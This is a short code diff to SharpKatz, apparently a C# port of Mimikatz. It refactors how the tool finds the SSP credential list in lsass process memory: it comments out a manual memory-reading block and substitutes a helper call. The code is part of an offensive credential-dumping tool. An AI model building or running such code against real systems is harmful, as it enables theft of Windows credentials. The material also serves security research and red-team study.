@@ -35,7 +35,7 @@ namespace SharpKatz.Module
             IntPtr msvLocal;
             IntPtr llCurrent;
             string passDecrypted = "";
-
+            /*
             // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
             msvLocal = Natives.LoadLibrary("msv1_0.dll");
             if (msvLocal == IntPtr.Zero)
@@ -66,6 +66,8 @@ namespace SharpKatz.Module
             tmp_p = IntPtr.Add(msvMem, (int)sspCredentialListSignOffset + oshelper.CREDENTIALLISTOFFSET + sizeof(int) + (int)sspCredentialListOffset);
             byte[] sspCredentialListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
             sspCredentialListAddr = new IntPtr(BitConverter.ToInt64(sspCredentialListAddrBytes, 0));
+            */
+            sspCredentialListAddr = Utility.GetListAdress(hLsass, msvMem, "msv1_0.dll", max_search_size, oshelper.CREDENTIALLISTOFFSET, oshelper.SspCredentialListSign);
 
             //Console.WriteLine("[*] Ssp  SspCredentialList found at address {0:X}", sspCredentialListAddr.ToInt64());
 
